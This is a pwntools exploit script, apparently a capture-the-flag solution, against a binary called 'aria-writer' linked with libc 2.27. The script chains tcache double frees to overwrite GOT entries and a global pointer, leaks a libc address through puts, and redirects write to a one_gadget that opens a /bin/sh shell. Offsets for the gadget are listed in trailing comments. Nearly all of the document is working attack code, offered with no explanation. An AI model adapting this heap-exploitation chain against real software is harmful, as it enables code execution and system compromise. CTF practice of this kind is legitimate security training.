#!/usr/bin/python
from pwn import *

s = process('./aria-writer')
elf = ELF('./aria-writer')
libc = ELF('./libc-2.27.so')

def write(size, data):
    s.sendlineafter('> ', '1')
    s.sendlineafter('> ', str(size))
    s.sendlineafter('> ', data)

def throw():
    s.sendlineafter('> ', '2')

def secret():
    s.sendlineafter('> ', '3')


global_addr = elf.sym['global']
write_got = elf.got['write']
free_got = elf.got['free']
puts_got = elf.got['puts']
puts_plt = elf.plt['puts']

s.sendlineafter('> ', 'AAAA')

# double free into write_got
write(0x38, 'a')
throw()
throw()
write(0x38, p64(write_got))
write(0x38, "")

# double free into global
write(0x28, 'b')
throw()
throw()
write(0x28, p64(global_addr))
write(0x28, "")

# double free into free_got
write(0x18, 'c')
throw()
throw()
write(0x18, p64(free_got))
write(0x18, "")

# free_got -> puts_plt
write(0x18, p64(puts_plt))
# global   -> puts_got
write(0x28, p64(puts_got))
# puts_plt(puts_got)
throw()

s.recvline()
leak = u64(s.recvline()[:-1].ljust(8, '\x00'))
log.success('leak    = ' +  hex(leak))
libc.address = leak - 0x809c0
log.success('libc    = ' +  hex(libc.address))
oneshot = libc.address + 0x4f322
log.success('oneshot = ' +  hex(oneshot))

# write -> oneshot
write(0x38, p64(oneshot))
# trigger oneshot
secret()

'''
gdb.attach(s, """
x/32gx 0x604200
python print('---------------------')
x/32gx 0x6020c0
""")
'''

s.interactive()

'''
0x4f2c5 execve("/bin/sh", rsp+0x40, environ)
constraints:
  rcx == NULL

0x4f322 execve("/bin/sh", rsp+0x40, environ)
constraints:
  [rsp+0x40] == NULL

0x10a38c execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
'''
